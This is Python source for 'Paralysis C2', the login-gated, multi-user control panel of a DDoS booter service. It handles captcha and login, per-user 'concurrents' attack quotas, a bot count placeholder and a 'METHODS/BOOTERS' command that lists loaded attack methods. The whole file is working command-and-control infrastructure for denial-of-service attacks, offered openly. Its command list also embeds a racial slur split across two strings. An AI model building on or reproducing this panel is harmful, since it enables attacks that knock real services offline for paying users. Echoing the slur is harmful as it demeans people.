'''
Paralysis C2 source
written by Null
'''

import socket, threading, time
from colorama import Fore, init

init() # initalize colorama

from src.core import Core
from src.config import Config
from src.utils import Utils
from src.logging import *
from src.captcha import Captcha
from src.database import Database
from src.tfx import Reader
from src.colors import Colors
from src.api import ApiConfig, Api
from src.themes import Theme

class Server():
    def __init__(self):
        self.mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a IPv4 TCP socket
        self.mainSock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1) # use keepalives
        self.mainSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if the socket closes we are reable to use that same port
        self.mainSock.settimeout(None) # StAbIlItY (basically removes the timeout from the socket)

        self.spinner_characters = iter(['|','/','-','\\','|','/','-','\\','|'])
    
    def getSpinner(self) -> str: 
        '''
        Cycles over a list of characters to be used in the spinner
        '''

        result = next(self.spinner_characters, None)
        if not result: # if we finish the cycling, we simply reset the value back
            self.spinner_characters = iter(['|','/','-','\\','|','/','-','\\','|'])
        
        return result
    
    def getMethods(self, theme:str or None=None, about_split:str=':') -> str:
        '''
        Returns all the loaded attack methods
        '''

        methodList = []
        for _, items in ApiConfig.methods.items():
            methodList.append((items['syntax'], items['about']))

        return Utils().themeList(theme, methodList)
    
    getMotd = lambda self: Core.motd # returns the MOTD
    getUsers = lambda self: str(len(Database().usersOnline())) # returns all the online users
    getBots = lambda self: '100' # placeholder until i actually add bot support
    getCommands = lambda self, theme: Utils().themeList(theme, [('ooga','booga'), ('nig','ga')])
    
    def close(self, client:socket.socket, address:tuple, username:str, tfx:object) -> None:
        '''
        Closes the connection
        '''

        tfx.execute_realtime(username, 'logout', lambda line: Utils().send(client, line))
        time.sleep(2)
        client.close()

        Database().editUser(username, 'online', False)
        logging.info(f'Client disconnected, {address[0]}:{str(address[1])}')
        return
    
    def titleHandler(self, client:socket.socket, username:str, tfx:object) -> None:
        '''
        Infinite loop that updates the title every 1 second
        '''
        while Core.isAlive:
            try:
                Utils().title(client, tfx.execute_file(username, 'title').strip())
            except:
                break

            time.sleep(1)
        
    def promptHandler(self, client:socket.socket, address:tuple, username:str, tfx:object) -> None:
        '''
        Sends the prompt to the user
        '''

        tfx.execute_realtime(username, 'post_auth', lambda line: Utils().send(client, line))
        for line in tfx.execute_file(username, 'banner').split('\n'):
            Utils().send(client, line)

        Utils().send(client, tfx.execute_file(username, 'prompt'), False)
        while Core.isAlive:

            data = Utils().recv(client)
            args = data.split(' ')

            match args[0].upper().replace(Theme.loadTheme(Theme.getTheme(username))['prefix'], ''):
                case 'EXIT'|'CLOSE'|'^C'|'QUIT'|'LOGOUT'|'KMS'|'LOLNOGTFO': # closes the connection
                    break

                case 'ECHO'|'PRINT': # echoes whatever the user sent
                    Utils().send(client, ' '.join(args[1:]))
                
                case 'CLEAR'|'CLS': # clears the screen
                    for line in tfx.execute_file(username, 'clear').split('\n'):
                        Utils().send(client, line)
                
                case 'METHODS'|'BOOTERS':
                    for line in tfx.execute_file(username, 'methods').split('\n'):
                        Utils().send(client, line)
                    
                case '?'|'HELP'|'HELPME':
                    for line in tfx.execute_file(username, 'help').split('\n'):
                        Utils().send(client, line)
                    
                case 'THEME'|'SETTHEME':
                    if len(args) == 1: # no arguments given, we simply print all the themes
                        for themeinfo in Theme.load():
                            Utils().send(client, themeinfo['name'])
                    else:
                        new = args[1]
                        if not Theme.validTheme(new):
                            Utils().send(client, 'Invalid theme'); continue

                        Database().editUser(username, 'theme', new)

                case _:
                    Utils().send(client, f'\r\n"{args[0]}" is not recognized as an internal or external command.\r\n')
            
            Utils().send(client, tfx.execute_file(username, 'prompt'), False)
        self.close(client, address, username, tfx)

    def login(self, client:socket.socket, address:tuple) -> None:
        '''
        Login screen
        '''
        Utils().clear(client)
        Utils().title(client, 'Paralysis C2 | Please login.')

        for i in range(Config.max_tries):
            Utils().send(client, 'Username > ', False)
            username = Utils().recv(client)

            Utils().send(client, '\r\nPassword > ', False)
            password = Utils().recv(client)

            if Database().login(username, password):
                Utils().clear(client)

                tfx = Reader() # because we initialize this class for every new user, it basically "contains" their information
                tfx.register_dict({
                    'clear': '\033[2J\033[H',
                    'users': self.getUsers,
                    'username': username,

                    # colors
                    'red': Fore.RED,
                    'blue': Fore.BLUE,
                    'green': Fore.GREEN,
                    'yellow': Fore.YELLOW,
                    'reset': Fore.RESET,
                    'magenta': Fore.MAGENTA,
                    'white': Fore.WHITE,
                    'cyan': Fore.CYAN,
                    'black': Fore.BLACK,
                    'grey': Fore.LIGHTBLACK_EX,
                    'purple': Colors().toANSI((180, 0, 251)), # purple
                    'orange': '\033[38;5;202m',
                    'hi_purple': '\033[0;95m', # high intensity purple
                    'hi_cyan': '\033[0;96m', # high intensity cyan
                    'hi_white': '\033[0;97m', # high intensity white
                    'hi_red': '\033[0;91m', # high intensity red
                })

                tfx.register_function('sleep', time.sleep)
                tfx.register_function('hex2ansi', Colors().HEXtoANSI)
                tfx.register_function('rgb2ansi', Colors().RGBtoANSI)
                tfx.register_function('hex2rgb', Colors().HEXtoRGB)
                tfx.register_function('rgb2hex', Colors().RGBtoHEX)
                tfx.register_function('2ansi', Colors().toANSI)
                tfx.register_function('getspinner', self.getSpinner)     
                tfx.register_function('users', self.getUsers) 
                tfx.register_function('motd', self.getMotd)
                tfx.register_function('bots', self.getBots)
                tfx.register_function('concurrents', lambda: Database().lookupUser(username)['concurrents'])
                tfx.register_function('concurrents_used', lambda: Database().lookupUser(username)['concurrents_used'])
                tfx.register_function('getCommands', lambda: self.getCommands(Database().lookupUser(username)['theme']))
                tfx.register_function('getMethods', lambda: self.getMethods(Database().lookupUser(username)['theme']))

                threading.Thread(target=self.titleHandler, args=(client, username, tfx,)).start()
                threading.Thread(target=self.promptHandler, args=(client, address, username, tfx,)).start()
                Database().editUser(username, 'online', True)

                return
            else:
                Utils().clear(client)
                Utils().send(client, f'Invalid credentials, please try again. You have {str((Config.max_tries-i)-1)}/{str(Config.max_tries)} attempts left\r\n')
                continue
        
        Utils().clear(client)
        Utils().send(client, 'Logging in failed.')
        time.sleep(2)
        logging.info(f'Client disconnected, {address[0]}:{str(address[1])}')

    def handler(self, client:socket.socket, address:tuple) -> None:
        '''
        User handler
        '''
        logging.info(f'Client connected, {address[0]}:{str(address[1])}')

        Utils().clear(client)

        # send captcha, if enabled
        if Config.captchaEnabled:
            Utils().title(client, 'Paralysis C2 | Please solve the captcha to login.')

            captcha, answer = Captcha().create(Config.captchaType)

            for line in captcha.split('\n'):
                Utils().send(client, line)
            
            Utils().send(client, 'Answer > ', False)
            userAnswer = Utils().recv(client)

            if answer in userAnswer:
                Utils().send(client, 'Captcha successfully completed.')
            else:
                Utils().send(client, 'Captcha failed.')
                time.sleep(3)
                logging.info(f'Client disconnected, {address[0]}:{str(address[1])}')
                return
        
        self.login(client, address)

    def launch(self) -> None:
        '''
        Takes care of the server launch
        '''

        logging.info(f'Binding to port {str(Config.port)}')
        try:
            self.mainSock.bind((Config.host, Config.port)) # bind to the specified interface and port
        except:
            logging.critical('Failed to bind to port, check if another process is using the port.')
            exit(1) # 1 indicates shutdown with errors
        
        logging.info('Listening for connections.')
        self.mainSock.listen()
        while Core.isAlive:
            threading.Thread(target=self.handler, args=[*self.mainSock.accept()]).start()
            time.sleep(0.01) # 